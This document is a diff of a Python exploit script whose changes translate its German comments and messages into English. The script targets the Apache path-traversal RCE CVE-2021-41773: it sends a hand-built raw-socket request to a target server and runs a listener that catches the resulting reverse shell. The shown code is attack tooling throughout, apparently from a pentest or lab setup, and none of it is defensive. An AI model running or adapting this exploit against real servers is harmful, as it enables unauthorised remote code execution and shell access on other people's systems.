@@ -5,13 +5,13 @@ from urllib.parse import urlparse
 
 
 def fire_exploit(target_url, lhost, lport):
-    """Sendet den Apache RCE-Exploit via raw TCP socket.
-    Wir bauen die HTTP-Anfrage manuell, weil sowohl `requests` als auch
-    `urllib3` die `%`-Zeichen im Pfad neu kodieren (`%32%65` → `%2532%2565`),
-    was die Path-Traversal von CVE-2021-41773 zerstört. Raw socket = keine
-    Normalisierung.
+    """Send the Apache RCE exploit via a raw TCP socket.
+    The HTTP request is built by hand because both `requests` and `urllib3`
+    re-encode the `%` characters in the path (`%32%65` → `%2532%2565`),
+    which destroys the path-traversal of CVE-2021-41773. Raw socket = no
+    normalisation.
     """
-    time.sleep(1)  # Listener Zeit zum Aufgehen geben
+    time.sleep(1)  # give the listener a moment to come up
 
     parsed = urlparse(target_url)
     host = parsed.hostname
@@ -33,18 +33,18 @@ def fire_exploit(target_url, lhost, lport):
         f"{payload}"
     )
 
-    print(f"[*] Sende Exploit an {host}:{port}{path}")
+    print(f"[*] Sending exploit to {host}:{port}{path}")
 
     s = None
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)  # Reverse Shell hängt den Request, kurzer Timeout reicht
+        s.settimeout(3)  # the reverse shell hijacks the request, a short timeout is enough
         s.connect((host, port))
         s.sendall(request.encode())
     except (socket.timeout, ConnectionResetError):
-        pass  # Erwartet, sobald die Reverse Shell die Verbindung übernimmt
+        pass  # expected once the reverse shell takes over the connection
     except Exception as e:
-        print(f"[-] Fehler beim Senden des Exploits: {e}")
+        print(f"[-] Error sending exploit: {e}")
     finally:
         if s is not None:
             try:
@@ -55,29 +55,29 @@ def fire_exploit(target_url, lhost, lport):
 
 def get_www_shell(target_ip, kali_ip, kali_port=4444):
     """
-    Startet den Listener, sendet den Exploit und fängt die Shell.
-    Gibt das Socket-Objekt (die Reverse Shell) zurück.
+    Start the listener, send the exploit, and catch the shell.
+    Returns the socket object (the reverse shell).
     """
     target_url = f"http://{target_ip}"
-    
-    # 1. Socket-Listener vorbereiten
+
+    # 1. Prepare the socket listener
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind(("0.0.0.0", kali_port))
     server.listen(1)
-    print(f"[*] Initial Access Listener gestartet auf Port {kali_port}...")
+    print(f"[*] Initial-access listener started on port {kali_port}...")
 
-    # 2. Exploit im Hintergrund senden 
+    # 2. Fire the exploit in the background
     threading.Thread(target=fire_exploit, args=(target_url, kali_ip, kali_port)).start()
 
-    # 3. Auf den Rückruf vom Apache warten (Blockierend)
-    server.settimeout(15) # 15 Sekunden auf Erfolg warten
+    # 3. Block until Apache calls back
+    server.settimeout(15)  # wait up to 15 seconds for success
     try:
         www_shell, addr = server.accept()
-        print(f"[+] Initial Access erfolgreich. Shell erhalten von {addr[0]}")
+        print(f"[+] Initial access successful. Shell received from {addr[0]}")
         return www_shell
     except socket.timeout:
-        print("[-] Timeout - Keine Shell vom Apache erhalten.")
+        print("[-] Timeout — no shell received from Apache.")
         return None
     finally:
-        server.close() # Den Listener-Port wieder freigeben
+        server.close()  # release the listener port
